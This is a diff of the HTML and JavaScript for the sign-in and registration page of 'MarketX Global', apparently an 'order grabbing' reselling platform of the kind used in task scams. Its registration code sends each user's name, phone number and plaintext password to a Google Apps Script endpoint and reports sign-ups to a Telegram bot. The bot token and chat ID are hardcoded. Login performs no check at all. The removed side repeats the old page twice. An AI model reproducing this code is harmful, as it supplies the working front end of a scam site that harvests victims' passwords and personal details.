@@ -3,204 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global MarketX | Professional E-Commerce</title>
+    <title>Global MarketX | Premium Platform</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #d4af37; --dark: #090909; --accent: #ffd700; }
-        body { font-family: 'Poppins', sans-serif; margin: 0; background: #000; color: white; }
+        :root { --gold: #d4af37; --dark: #0a0a0a; --gray: #1a1a1a; --text: #e0e0e0; }
+        body { font-family: 'Poppins', sans-serif; margin: 0; background: var(--dark); color: var(--text); overflow-x: hidden; }
         
-        /* Premium Ad Slider */
-        .ad-container { height: 280px; position: relative; overflow: hidden; }
-        .ad-slide { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
-        .welcome-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-                           background: linear-gradient(to bottom, transparent, #000); }
-        .welcome-text { position: absolute; bottom: 30px; left: 20px; }
+        /* Premium Ad Header */
+        .ad-header { height: 280px; position: relative; background: url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=800') center/cover; }
+        .overlay { position: absolute; inset: 0; background: linear-gradient(to bottom, transparent, var(--dark)); }
+        .welcome-msg { position: absolute; bottom: 30px; left: 20px; z-index: 2; }
+        .welcome-msg h1 { color: var(--gold); margin: 0; font-size: 26px; text-transform: uppercase; letter-spacing: 2px; }
 
-        /* Professional Form */
-        .form-section { padding: 40px 25px; background: #111; border-radius: 35px 35px 0 0; margin-top: -35px; position: relative; }
-        .tabs { display: flex; justify-content: space-around; margin-bottom: 30px; }
-        .tab { font-size: 18px; font-weight: 600; color: #555; cursor: pointer; transition: 0.3s; }
-        .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 5px; }
+        /* Modern Form Container */
+        .form-container { padding: 40px 20px; background: var(--gray); border-radius: 30px 30px 0 0; margin-top: -30px; position: relative; z-index: 3; box-shadow: 0 -10px 20px rgba(0,0,0,0.5); }
+        .tabs { display: flex; justify-content: center; gap: 40px; margin-bottom: 30px; }
+        .tab { font-size: 16px; font-weight: 600; color: #666; cursor: pointer; transition: 0.3s; padding-bottom: 5px; }
+        .tab.active { color: var(--gold); border-bottom: 2px solid var(--gold); }
 
-        input { width: 100%; padding: 15px; margin: 12px 0; background: #1a1a1a; border: 1px solid #333; 
-                border-radius: 12px; color: white; font-size: 15px; outline: none; }
-        input:focus { border-color: var(--accent); }
+        .input-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 15px; background: #222; border: 1px solid #333; border-radius: 12px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--gold); background: #2a2a2a; }
 
-        .btn-action { width: 100%; padding: 16px; background: var(--accent); color: black; border: none; 
-                      border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        
+        .btn-main { width: 100%; padding: 16px; background: var(--gold); color: black; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
+
         #register-form { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="ad-container">
-        <img src="https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=800" class="ad-slide">
-        <div class="welcome-overlay"></div>
-        <div class="welcome-text">
-            <h1 style="margin:0; font-size: 28px; color: var(--accent);">MARKETX GLOBAL</h1>
-            <p style="margin:5px 0; opacity: 0.8;">Premium Order Grabbing Platform</p>
+    <div class="ad-header">
+        <div class="overlay"></div>
+        <div class="welcome-msg">
+            <h1>MarketX Global</h1>
+            <p style="margin:5px 0; opacity: 0.7;">The Future of E-Commerce Reselling</p>
         </div>
     </div>
 
-    <div class="form-section">
+    <div class="form-container">
         <div class="tabs">
-            <span class="tab active" id="l-tab" onclick="toggleForm('login')">LOGIN</span>
-            <span class="tab" id="r-tab" onclick="toggleForm('register')">REGISTER</span>
+            <span class="tab active" id="tab-login" onclick="switchTab('login')">SIGN IN</span>
+            <span class="tab" id="tab-register" onclick="switchTab('register')">REGISTER</span>
         </div>
 
         <div id="login-form">
-            <input type="text" id="l-phone" placeholder="Phone Number">
-            <input type="password" id="l-pass" placeholder="Password">
-            <button class="btn-action" onclick="processLogin()">SIGN IN</button>
+            <div class="input-group"><input type="text" id="l-phone" placeholder="Phone Number"></div>
+            <div class="input-group"><input type="password" id="l-pass" placeholder="Password"></div>
+            <button class="btn-main" onclick="onLogin()">LOGIN</button>
         </div>
 
         <div id="register-form">
-            <input type="text" id="r-name" placeholder="Full Name">
-            <input type="text" id="r-phone" placeholder="Phone Number">
-            <input type="password" id="r-pass" placeholder="Create Password">
-            <input type="text" id="r-invite" placeholder="Invitation Code (Required)">
-            <button class="btn-action" onclick="processRegister()">CREATE ACCOUNT</button>
+            <div class="input-group"><input type="text" id="r-name" placeholder="Full Name"></div>
+            <div class="input-group"><input type="text" id="r-phone" placeholder="Phone Number"></div>
+            <div class="input-group"><input type="password" id="r-pass" placeholder="Create Password"></div>
+            <div class="input-group"><input type="text" id="r-invite" placeholder="Invitation Code"></div>
+            <button class="btn-main" onclick="onRegister()">CREATE ACCOUNT</button>
         </div>
     </div>
 
     <script>
-        function toggleForm(type) {
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwEV8gFBjcbmUz2636KmlJ_t_nIojePg5NynSx6MjqxAjioDCHTSrvs6t3jfizvbKzO/exec';
+
+        function switchTab(type) {
             document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
             document.getElementById('register-form').style.display = type === 'register' ? 'block' : 'none';
-            document.getElementById('l-tab').classList.toggle('active', type === 'login');
-            document.getElementById('r-tab').classList.toggle('active', type === 'register');
+            document.getElementById('tab-login').classList.toggle('active', type === 'login');
+            document.getElementById('tab-register').classList.toggle('active', type === 'register');
         }
 
-        function processRegister() {
-            const name = document.getElementById('r-name').value;
-            const phone = document.getElementById('r-phone').value;
-            const pass = document.getElementById('r-pass').value;
-            const invite = document.getElementById('r-invite').value;
+        async function onRegister() {
+            const data = {
+                name: document.getElementById('r-name').value,
+                phone: document.getElementById('r-phone').value,
+                pass: document.getElementById('r-pass').value,
+                invite: document.getElementById('r-invite').value
+            };
 
-            if(!name || !phone || !pass || !invite) {
+            if(!data.name || !data.phone || !data.pass || !data.invite) {
                 alert("Please fill all fields!");
                 return;
             }
 
-            // Telegram Notification
-            const token = "YOUR_BOT_TOKEN";
-            const chat_id = "YOUR_CHAT_ID";
-            const msg = `New User Alert!\nName: ${name}\nPhone: ${phone}\nPass: ${pass}\nInvite: ${invite}`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
-            .then(() => {
-                alert("Registration Submitted! Please wait for Admin approval.");
-                toggleForm('login');
-            });
-        }
+            // Save to Google Sheets
+            try {
+                await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+                
+                // Telegram Notification
+                const botToken = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzU";
+                const chatId = "6698333806";
+                const msg = `🔔 New User Registration\nName: ${data.name}\nPhone: ${data.phone}\nInvite Code: ${data.invite}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
 
-        function processLogin() {
-            // Dashboard သို့ တိုက်ရိုက်သွားရန် (အဆင့် ၂ တွင် Database နှင့် ချိတ်ပါမည်)
-            window.location.href = "dashboard.html";
-        }
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global MarketX | Professional E-Commerce</title>
-    <style>
-        :root { --gold: #d4af37; --dark: #090909; --accent: #ffd700; }
-        body { font-family: 'Poppins', sans-serif; margin: 0; background: #000; color: white; }
-        
-        /* Premium Ad Slider */
-        .ad-container { height: 280px; position: relative; overflow: hidden; }
-        .ad-slide { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
-        .welcome-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-                           background: linear-gradient(to bottom, transparent, #000); }
-        .welcome-text { position: absolute; bottom: 30px; left: 20px; }
-
-        /* Professional Form */
-        .form-section { padding: 40px 25px; background: #111; border-radius: 35px 35px 0 0; margin-top: -35px; position: relative; }
-        .tabs { display: flex; justify-content: space-around; margin-bottom: 30px; }
-        .tab { font-size: 18px; font-weight: 600; color: #555; cursor: pointer; transition: 0.3s; }
-        .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 5px; }
-
-        input { width: 100%; padding: 15px; margin: 12px 0; background: #1a1a1a; border: 1px solid #333; 
-                border-radius: 12px; color: white; font-size: 15px; outline: none; }
-        input:focus { border-color: var(--accent); }
-
-        .btn-action { width: 100%; padding: 16px; background: var(--accent); color: black; border: none; 
-                      border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        
-        #register-form { display: none; }
-    </style>
-</head>
-<body>
-
-    <div class="ad-container">
-        <img src="https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=800" class="ad-slide">
-        <div class="welcome-overlay"></div>
-        <div class="welcome-text">
-            <h1 style="margin:0; font-size: 28px; color: var(--accent);">MARKETX GLOBAL</h1>
-            <p style="margin:5px 0; opacity: 0.8;">Premium Order Grabbing Platform</p>
-        </div>
-    </div>
-
-    <div class="form-section">
-        <div class="tabs">
-            <span class="tab active" id="l-tab" onclick="toggleForm('login')">LOGIN</span>
-            <span class="tab" id="r-tab" onclick="toggleForm('register')">REGISTER</span>
-        </div>
-
-        <div id="login-form">
-            <input type="text" id="l-phone" placeholder="Phone Number">
-            <input type="password" id="l-pass" placeholder="Password">
-            <button class="btn-action" onclick="processLogin()">SIGN IN</button>
-        </div>
-
-        <div id="register-form">
-            <input type="text" id="r-name" placeholder="Full Name">
-            <input type="text" id="r-phone" placeholder="Phone Number">
-            <input type="password" id="r-pass" placeholder="Create Password">
-            <input type="text" id="r-invite" placeholder="Invitation Code (Required)">
-            <button class="btn-action" onclick="processRegister()">CREATE ACCOUNT</button>
-        </div>
-    </div>
-
-    <script>
-        function toggleForm(type) {
-            document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
-            document.getElementById('register-form').style.display = type === 'register' ? 'block' : 'none';
-            document.getElementById('l-tab').classList.toggle('active', type === 'login');
-            document.getElementById('r-tab').classList.toggle('active', type === 'register');
-        }
-
-        function processRegister() {
-            const name = document.getElementById('r-name').value;
-            const phone = document.getElementById('r-phone').value;
-            const pass = document.getElementById('r-pass').value;
-            const invite = document.getElementById('r-invite').value;
-
-            if(!name || !phone || !pass || !invite) {
-                alert("Please fill all fields!");
-                return;
+                alert("Registration Successful! Please Login.");
+                switchTab('login');
+            } catch (e) {
+                alert("Error connecting to server. Please try again.");
             }
-
-            // Telegram Notification
-            const token = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzUN";
-            const chat_id = "6698333806";
-            const msg = `New User Alert!\nName: ${name}\nPhone: ${phone}\nPass: ${pass}\nInvite: ${invite}`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
-            .then(() => {
-                alert("Registration Submitted! Please wait for Admin approval.");
-                toggleForm('login');
-            });
         }
 
-        function processLogin() {
-            // Dashboard သို့ တိုက်ရိုက်သွားရန် (အဆင့် ၂ တွင် Database နှင့် ချိတ်ပါမည်)
+        function onLogin() {
+            // Dashboard Page ကို နောက်တဆင့်မှာ တည်ဆောက်ပါမယ်
             window.location.href = "dashboard.html";
         }
     </script>
 </body>
 </html>
-
